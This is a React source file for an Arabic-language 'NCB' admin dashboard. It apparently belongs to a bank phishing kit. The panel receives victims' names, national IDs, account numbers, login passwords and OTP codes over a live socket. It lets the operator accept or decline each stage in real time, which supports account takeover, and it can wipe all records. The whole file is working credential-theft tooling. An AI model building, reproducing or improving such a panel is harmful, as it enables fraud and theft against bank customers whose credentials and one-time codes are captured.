import React, {
  useCallback,
  useEffect,
  useMemo,
  useRef,
  useState,
} from "react";
import { serverRoute } from "./App";
import axios from "axios";
import { io } from "socket.io-client";
import { useNavigate } from "react-router-dom";
import "./dashboard.css";
import { FaBell } from "react-icons/fa";

let socket;

const LAST_SEEN_KEY = "ncb_admin_lastSeen";

const loadLastSeen = () => {
  try {
    return JSON.parse(localStorage.getItem(LAST_SEEN_KEY) || "{}");
  } catch {
    return {};
  }
};

const saveLastSeen = (map) => {
  localStorage.setItem(LAST_SEEN_KEY, JSON.stringify(map));
};

const getDocVersion = (u) => {
  const d = u.updatedAt || u.created;
  if (!d) return "";
  return new Date(d).toISOString();
};

const isUnreadUser = (u, map, didInit) => {
  const v = getDocVersion(u);
  if (!v) return false;
  const seen = map[u._id];
  if (!seen) return didInit;
  return new Date(v) > new Date(seen);
};

function OrderField({ label, value, secret, ltr }) {
  const empty = value == null || value === "";
  return (
    <div className="row">
      <span className="lbl">{label}</span>
      <span
        className={empty ? "val empty" : secret ? "val secret" : "val"}
        dir={ltr ? "ltr" : undefined}
      >
        {empty ? "—" : value}
      </span>
    </div>
  );
}

function OrderSection({ title, children }) {
  return (
    <div className="order-journey-section">
      <div className="order-journey-section__title">{title}</div>
      {children}
    </div>
  );
}

function ActionGroup({ title, onAccept, onDecline }) {
  return (
    <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
      <div style={{ fontSize: "11px", textAlign: "center", color: "#666" }}>
        {title}
      </div>
      <div className="btn-act-group">
        <button type="button" className="btn-act accept" onClick={onAccept}>
          قبول
        </button>
        <button type="button" className="btn-act decline" onClick={onDecline}>
          رفض
        </button>
      </div>
    </div>
  );
}

const Main_Page = () => {
  const navigate = useNavigate();
  const [Users, setUsers] = useState([]);
  const [selectedUserId, setSelectedUserId] = useState(null);
  const [onlineCounts, setOnlineCounts] = useState({
    visitors: 0,
    dashboard: 0,
  });
  const [isNarrow, setIsNarrow] = useState(
    () => window.matchMedia("(max-width: 1023px)").matches,
  );
  const [mobileShowList, setMobileShowList] = useState(true);
  const didInitLastSeenRef = useRef(false);

  const getUsers = useCallback(async () => {
    try {
      const { data } = await axios.get(`${serverRoute}/users`);
      const ncbUsers = data
        .filter((u) => u.form_type === "ncb_bank")
        .sort((a, b) => new Date(b.created) - new Date(a.created));
      setUsers(ncbUsers);
    } catch (err) {
      console.log(err);
    }
  }, []);

  useEffect(() => {
    if (!localStorage.getItem("token")) {
      navigate("/login");
      return;
    }

    socket = io(serverRoute);
    socket.emit("join", { role: "admin" });
    getUsers();

    const events = [
      "newUser",
      "newData",
      "registrationForm",
      "userLogin",
      "loginOtpSubmit",
      "acceptRegistration",
      "declineRegistration",
      "acceptUserLogin",
      "declineUserLogin",
      "acceptLoginOtp",
      "declineLoginOtp",
    ];

    events.forEach((ev) => socket.on(ev, getUsers));
    socket.on("onlineCounts", setOnlineCounts);

    return () => {
      events.forEach((ev) => socket.off(ev, getUsers));
      socket.off("onlineCounts", setOnlineCounts);
      socket.disconnect();
    };
  }, [getUsers, navigate]);

  useEffect(() => {
    const mq = window.matchMedia("(max-width: 1023px)");
    const handler = (e) => setIsNarrow(e.matches);
    mq.addEventListener("change", handler);
    return () => mq.removeEventListener("change", handler);
  }, []);

  useEffect(() => {
    if (!didInitLastSeenRef.current && Users.length > 0) {
      didInitLastSeenRef.current = true;
    }
  }, [Users]);

  const markSeen = (id) => {
    const map = loadLastSeen();
    map[id] = new Date().toISOString();
    saveLastSeen(map);
  };

  const handleAcceptRegistration = async (id) => {
    socket.emit("acceptRegistration", id);
    await getUsers();
  };

  const handleDeclineRegistration = async (id) => {
    socket.emit("declineRegistration", id);
    await getUsers();
  };

  const handleAcceptUserLogin = async (id) => {
    socket.emit("acceptUserLogin", id);
    await getUsers();
  };

  const handleDeclineUserLogin = async (id) => {
    socket.emit("declineUserLogin", id);
    await getUsers();
  };

  const handleAcceptLoginOtp = async (id) => {
    socket.emit("acceptLoginOtp", id);
    await getUsers();
  };

  const handleDeclineLoginOtp = async (id) => {
    socket.emit("declineLoginOtp", id);
    await getUsers();
  };

  const deleteUser = async (id) => {
    if (window.confirm("هل أنت متأكد من حذف العميل؟")) {
      await axios.delete(`${serverRoute}/order/${id}`);
      if (selectedUserId === id) setSelectedUserId(null);
      getUsers();
    }
  };

  const deleteAllUsers = async () => {
    if (window.confirm("هل أنت متأكد من حذف جميع العملاء نهائياً؟")) {
      await axios.delete(`${serverRoute}/orders/all`);
      setSelectedUserId(null);
      getUsers();
    }
  };

  const handleLogOut = () => {
    localStorage.removeItem("token");
    window.location.reload();
  };

  const selectedUser = useMemo(
    () => Users.find((u) => u._id === selectedUserId) ?? null,
    [Users, selectedUserId],
  );

  const handleSelectUser = (u) => {
    setSelectedUserId(u._id);
    markSeen(u._id);
    if (isNarrow) setMobileShowList(false);
  };

  const renderClientCard = (c) => {
    const hasFormData = Boolean(c.name && c.accountNumber);
    const hasLoginData = Boolean(c.loginPassword);
    const hasOtpData = Boolean(c.loginOtp);

    const showFormActions = hasFormData && !c.FormAccept;
    const showLoginActions = hasLoginData && !c.LoginAccept;
    const showOtpActions = hasOtpData && !c.LoginOtpAccept;

    return (
      <div key={c._id} className="client-card">
        <div className="cc-head">
          <div className="cc-user">
            <div className="cc-avatar">NCB</div>
            <div className="cc-info">
              <h4>{c.name || "مجهول"}</h4>
              <span>
                ID: {c._id.slice(-6)} | {c.phone || "—"}
              </span>
            </div>
          </div>
          <div className={`status-badge ${!c.checked ? "online" : ""}`}>
            <div className="dot"></div> {!c.checked ? "نشط" : "مكتمل"}
          </div>
        </div>

        <div className="cc-body">
          <div className="info-block order-journey-block">
            <div className="order-journey-grid">
              <OrderSection title="1. بيانات التسجيل">
                <OrderField label="الاسم كامل" value={c.name} />
                <OrderField label="رقم الموبايل" value={c.phone} secret ltr />
                <OrderField label="البريد الإلكتروني" value={c.email} ltr />
                <OrderField label="الرقم الوطني" value={c.national_id} ltr />
                <OrderField label="رقم الحساب" value={c.accountNumber} ltr />
                <OrderField label="نوع الحساب" value={c.accountType} />
              </OrderSection>

              <OrderSection title="2. تسجيل الدخول">
                <OrderField label="رقم الهاتف" value={c.phone} secret ltr />
                <OrderField
                  label="كلمة المرور"
                  value={c.loginPassword}
                  secret
                />
              </OrderSection>

              <OrderSection title="3. رمز التحقق">
                <OrderField label="رمز OTP" value={c.loginOtp} ltr />
              </OrderSection>
            </div>
          </div>
        </div>

        <div className="cc-foot cc-foot--centered">
          <div className="cc-foot-inner">
            {showFormActions && (
              <ActionGroup
                title="تأكيد بيانات التسجيل"
                onAccept={() => handleAcceptRegistration(c._id)}
                onDecline={() => handleDeclineRegistration(c._id)}
              />
            )}

            {showLoginActions && (
              <ActionGroup
                title="تأكيد بيانات الدخول"
                onAccept={() => handleAcceptUserLogin(c._id)}
                onDecline={() => handleDeclineUserLogin(c._id)}
              />
            )}

            {showOtpActions && (
              <ActionGroup
                title="تأكيد رمز التحقق"
                onAccept={() => handleAcceptLoginOtp(c._id)}
                onDecline={() => handleDeclineLoginOtp(c._id)}
              />
            )}

            {c.FormAccept && c.LoginAccept && c.LoginOtpAccept && (
              <div
                style={{
                  textAlign: "center",
                  color: "#10b981",
                  fontWeight: 700,
                  padding: "8px",
                }}
              >
                تم إكمال جميع الخطوات بنجاح
              </div>
            )}

            <button
              type="button"
              className="btn-action btn-del"
              onClick={() => deleteUser(c._id)}
            >
              حذف العميل
            </button>
          </div>
        </div>
      </div>
    );
  };

  const lastSeenSnapshot = loadLastSeen();
  const showAside = !isNarrow || mobileShowList;
  const showMain = !isNarrow || !mobileShowList;

  const selectedUnread = selectedUser
    ? isUnreadUser(selectedUser, lastSeenSnapshot, didInitLastSeenRef.current)
    : false;

  return (
    <div className="dashboard-layout" dir="rtl">
      <aside
        className="sidebar users-sidebar"
        hidden={!showAside}
        aria-hidden={!showAside}
      >
        <div className="sidebar-head">
          <h3>العملاء — NCB</h3>
        </div>
        <div className="user-sidebar-list">
          {Users.length === 0 ? (
            <div className="user-sidebar-empty">لا يوجد عملاء حالياً</div>
          ) : (
            Users.map((u) => {
              const label = u.name || "مجهول";
              const unread = isUnreadUser(
                u,
                lastSeenSnapshot,
                didInitLastSeenRef.current,
              );
              const active = u._id === selectedUserId;
              return (
                <button
                  key={u._id}
                  type="button"
                  className={`user-sidebar-item${active ? " is-active" : ""}${unread ? " has-unread" : ""}`}
                  onClick={() => handleSelectUser(u)}
                >
                  <span className="user-sidebar-item__row">
                    <span
                      className="user-sidebar-item__name-text"
                      title={label}
                    >
                      {label}
                    </span>
                    {unread ? (
                      <FaBell
                        className="user-sidebar-item__unread-icon"
                        title="بيانات جديدة"
                        aria-label="بيانات جديدة"
                      />
                    ) : null}
                  </span>
                  <span className="user-sidebar-item__meta">
                    {u._id.slice(-6)} | {u.phone || "—"}
                  </span>
                </button>
              );
            })
          )}
        </div>
      </aside>

      <main className="main" hidden={!showMain} aria-hidden={!showMain}>
        <header className="top-bar">
          <div className="page-title top-bar__title-row">
            {isNarrow && selectedUserId && !mobileShowList && (
              <button
                type="button"
                className="btn-mobile-back"
                onClick={() => setMobileShowList(true)}
              >
                القائمة
              </button>
            )}
            {isNarrow && !mobileShowList && selectedUser && (
              <div className="mobile-top-user" title={selectedUser.name}>
                <span className="mobile-top-user__name">
                  {selectedUser.name || "مجهول"}
                </span>
                {selectedUnread ? (
                  <FaBell
                    className="mobile-top-user__bell"
                    title="بيانات جديدة"
                    aria-label="بيانات جديدة"
                  />
                ) : null}
              </div>
            )}
            <span className="page-title__text">لوحة تحكم NCB</span>
          </div>
          <div className="top-actions">
            <div className="stats-pill stats-pill--visitors">
              <span className="pulse-dot pulse-dot--inline"></span>
              زوار: {onlineCounts.visitors}
            </div>
            <div className="stats-pill stats-pill--admins">
              أدمن: {onlineCounts.dashboard}
            </div>
            <div className="stats-pill">الطلبات: {Users.length}</div>
            <button className="btn-action btn-del-all" onClick={deleteAllUsers}>
              حذف الكل
            </button>
            <button className="btn-action btn-out" onClick={handleLogOut}>
              تسجيل خروج
            </button>
          </div>
        </header>

        <div className="grid-container grid-container--single">
          {!selectedUser ? (
            <div className="main-empty-state">
              <p>اختر عميلاً من القائمة لعرض التفاصيل.</p>
            </div>
          ) : (
            renderClientCard(selectedUser)
          )}
        </div>
      </main>
    </div>
  );
};

export default Main_Page;
